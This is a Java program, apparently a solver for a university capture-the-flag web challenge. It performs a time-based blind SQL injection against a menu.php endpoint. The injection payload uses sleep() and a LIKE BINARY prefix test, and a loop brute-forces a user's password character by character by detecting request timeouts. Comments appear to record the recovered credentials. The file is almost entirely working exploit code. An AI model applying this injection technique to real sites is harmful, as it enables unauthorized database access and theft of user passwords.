package it.fabiochini;

import java.io.IOException;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.time.Duration;
import java.util.List;
import java.util.Scanner;
import java.util.function.Consumer;

/**
 * Hello world!
 *
 */
public class App {

    private static final Integer timeout = 10000;
    private static final String BASE_URL = "https://web7.chall.necst.it/menu.php?choice=1' and ((select count(*) from users where username='%s' and password like binary \"%s%c%%25\") <= 0 or sleep(%d) and '1'='1'); --";
    private static String pwd = "Co"; // JVT3PgQ2zbwbiBi
    private static String user = "Sten"; // Yesenia

    private static final HttpClient client = HttpClient.newHttpClient();

    private static final List<Character> alphabet = List.of(
            'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',
            'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z',
            '0','1','2','3','4','5','6','7','8','9'
    );

    public static void main( String[] args ) throws InterruptedException {
        Display display = Display.create();

        for (int i = 0; i < (16 - pwd.length()); i++) {
            if (!guessLetter(display::updateText))
                System.exit(-1);
            Thread.sleep(timeout);
        }

        System.out.println(pwd);
    }

    public static boolean guessLetter(Consumer<String> onGuess) {
        for (Character guess : alphabet) {
            String uri = BASE_URL.formatted(user, pwd, guess, timeout)
                    .replace("(", "%28")
                    .replace(")", "%29")
                    .replace(" ", "+")
                    .replace("'", "%27")
                    .replace("*", "%2a")
                    .replace("<", "%3c")
                    .replace("\"", "%22")
                    .replace(";", "%3b")
                    .replace("-", "%2d");

            HttpRequest request = HttpRequest.newBuilder()
                    .GET()
                    .uri(URI.create(uri))
                    .timeout(Duration.ofMillis(timeout - 2000))
                    .build();

            try {
                HttpResponse<String> res = client.send(request, HttpResponse.BodyHandlers.ofString());
                System.out.println("response size from guess " + guess  + " is " + res.body().length());
                Thread.sleep(100);
            } catch (IOException e) {
                System.out.println("match!");
                pwd = pwd.concat(String.valueOf(guess));
                onGuess.accept(pwd);
                return true;
            } catch (InterruptedException e) {
                return false;
            }
        }

        onGuess.accept("Attenzione nessun guess");
        return true;
    }
}
